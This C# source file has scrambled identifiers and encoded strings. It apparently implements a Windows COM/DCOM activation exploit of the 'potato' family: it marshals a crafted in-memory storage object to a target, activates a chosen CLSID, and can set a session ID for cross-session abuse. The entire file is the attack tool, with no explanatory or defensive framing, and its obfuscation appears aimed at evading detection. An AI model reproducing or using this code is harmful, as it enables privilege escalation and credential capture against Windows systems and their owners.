﻿using Microsoft.Win32;
using AsseroKicksSwifed.TaceaeSchaNan;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Linq;

namespace AsseroKicksSwifed
{
    class BriesBulinBload
    {
        [Guid("47707f23-66ca-4571-9813-6acd70137940")]
        [ComImport]
        private class CodomFeismSoccian
        {
        }

        private static readonly RepremRegistMas.PanidishFlavaliteCounter[] EthetismCrateForgated = new RepremRegistMas.PanidishFlavaliteCounter[]{new RepremRegistMas.PanidishFlavaliteCounter()
        {FormationFutedneyTerotosi = 5, }};
        private static readonly int IntryRediticSprus = RepremRegistMas.CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RepremRegistMas.VenateOutaMcco.CackingUnchyHexaspet, RepremRegistMas.TricNoncyKhance.UnnyctiHatesBipate, IntPtr.Zero, RepremRegistMas.FormerusPanessNickers.SableCoelessNonpungly, IntPtr.Zero);
        public static int StramFinaryWeave(string PartermaUnificallSubter, string ScordiachWashipShes)
        {
            int ChannedLawBine = 0;
            Guid HypetBentasterNeian = new Guid(PartermaUnificallSubter);
            try
            {
                ChannedLawBine = RepremRegistMas.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
                ChannedLawBine = RepremRegistMas.StgCreateDocfileOnILockBytes(lockBytes, RepremRegistMas.PolysisBismMoots.OrtHolousIncepts | RepremRegistMas.PolysisBismMoots.JewerleysProlleHemorpin | RepremRegistMas.PolysisBismMoots.UnsiveKersGraphic, 0, out IStorage storage);
                StramerWarkingKoration ProtteCopulenerCaussi = new StramerWarkingKoration(storage, ScordiachWashipShes, SplargicGodlyProbornic.FairstangSoesSulphui);
                RepremRegistMas.MistMistsCoquent[] PredesiaAransUnjuria = new RepremRegistMas.MistMistsCoquent[1];
                PredesiaAransUnjuria[0].OleSemisdailShawk = RepremRegistMas.SupersSmodonMusesthes;
                PredesiaAransUnjuria[0].BeateTakeLamy = null;
                PredesiaAransUnjuria[0].TaraHoymenterCirratink = 0;
                ChannedLawBine = RepremRegistMas.CoGetInstanceFromIStorage(null, ref HypetBentasterNeian, null, RepremRegistMas.TetrapOaksPertify.ExpuggistHawkPant, ProtteCopulenerCaussi, 1, PredesiaAransUnjuria);
            }
            catch (Exception e)
            {
            }

            return 0;
        }

        public static int TalCopyMentoll(string PartermaUnificallSubter, string ScordiachWashipShes, int DirtIntPreeness = -1)
        {
            Guid HypetBentasterNeian = new Guid(PartermaUnificallSubter);
            IStorage ShesAteAceral;
            ILockBytes PermansElaidShrusinae;
            int ChannedLawBine;
            try
            {
                ChannedLawBine = RepremRegistMas.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out PermansElaidShrusinae);
                ChannedLawBine = RepremRegistMas.StgCreateDocfileOnILockBytes(PermansElaidShrusinae, RepremRegistMas.PolysisBismMoots.OrtHolousIncepts | RepremRegistMas.PolysisBismMoots.JewerleysProlleHemorpin | RepremRegistMas.PolysisBismMoots.UnsiveKersGraphic, 0, out ShesAteAceral);
                StramerWarkingKoration ProtteCopulenerCaussi = new StramerWarkingKoration(ShesAteAceral, ScordiachWashipShes, SplargicGodlyProbornic.FairstangSoesSulphui);
                Guid PyrenRglademicVers = new Guid(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("iSSSSSSSShSSSShSSSSh[SSShSSSSSSSSSSAuq"));
                Guid ExtrenUnbleaShoral = new Guid(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("iSSSSSyy[hSSSShSSSSheSSShSSSSSSSSSSAuq"));
                Guid ViousRepilgaeAntles = typeof(IStandardActivator).GUID;
                RepremRegistMas.MistMistsCoquent[] PredesiaAransUnjuria = new RepremRegistMas.MistMistsCoquent[1];
                PredesiaAransUnjuria[0].OleSemisdailShawk = RepremRegistMas.SupersSmodonMusesthes;
                PredesiaAransUnjuria[0].BeateTakeLamy = null;
                PredesiaAransUnjuria[0].TaraHoymenterCirratink = 0;
                var BroDistsCally = (IStandardActivator)new CodomFeismSoccian();
                uint MoroptZarPrefing = RepremRegistMas.CoCreateInstance(ref ExtrenUnbleaShoral, null, 0x1, ref ViousRepilgaeAntles, out object instance);
                Console.WriteLine(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("7*dz[K[/m0(m)N.(0NemfziSq"), (RepremRegistMas.MopectionBeeriteUnders)MoroptZarPrefing);
                BroDistsCally = (IStandardActivator)instance;
                if (DirtIntPreeness != -1)
                {
                    ISpecialSystemPropertiesActivator RetScheusePolated = (ISpecialSystemPropertiesActivator)BroDistsCally;
                    Console.WriteLine(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("7*dz8g0PN1N2z1Nz.m..1KNziSq"), DirtIntPreeness);
                    RetScheusePolated.OvedUnemeSuppy(DirtIntPreeness, 0, 1);
                }

                ChannedLawBine = BroDistsCally.TratiousPlearAviomator(null, HypetBentasterNeian, IntPtr.Zero, TetrapOaksPertify.UnfemiaSineledPed, ProtteCopulenerCaussi, 1, PredesiaAransUnjuria);
                Console.WriteLine(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("7*dz8(0Nx0/x m()N.(0Nem9/KV)8(K/02mmfziSq"), ChannedLawBine);
            }
            catch (Exception e)
            {
            }

            return 0;
        }

        [STAThread]
        static void Main(string[] PectasisAlvacceptEvers)
        {
            int FluviumCollaAbble = 0;
            int PolysingTringStraorate;
            string OcciatizeCcwMes;
            string FledLitholdedSes;
            string MesDoodLacts = GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("iAllFxyAOhMS0FhArlFhMyOuhyyrMyuuOlSl]q");
            if (PectasisAlvacceptEvers.Length < 1)
            {
                Console.WriteLine(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("B.02mfz8n0/g-eKVI/122m/Em}mz<I0/2m(z)J>z<eL.1x>z<.m..1KN>"));
                Console.WriteLine(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("B.02mfz8n0/g-eKVI/122m/Em}mzFlrEFuMEFEFSz\"iAllFxyAOhMS0FhArlFhMyOuhyyrMyuuOlSl]q\""));
                Console.WriteLine(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("B.02mfz8n0/g-eKVI/122m/Em}mzFlrEFuMEFEFSz\"i{Fu]+Ar9h[FFFhA],Fh,[[AhMW,+WuF+S+{Aq\"zF"));
                return;
            }
            else
            {
                FledLitholdedSes = PectasisAlvacceptEvers[0];
            }

            if (PectasisAlvacceptEvers.Length >= 2)
            {
                MesDoodLacts = PectasisAlvacceptEvers[1];
            }

            if (FluviumCollaAbble > 0)
                OcciatizeCcwMes = String.Format(GlyHoulationWeignable.LockedPriaCologier.GodlikeSemishnesSuperidae("iSq7iFqd"), FledLitholdedSes, FluviumCollaAbble);
            else
                OcciatizeCcwMes = FledLitholdedSes;
            if (PectasisAlvacceptEvers.Length >= 3)
            {
                PolysingTringStraorate = int.Parse(PectasisAlvacceptEvers[2]);
                TalCopyMentoll(MesDoodLacts, OcciatizeCcwMes, PolysingTringStraorate);
            }
            else
            {
                StramFinaryWeave(MesDoodLacts, OcciatizeCcwMes);
            }
        }
    }
}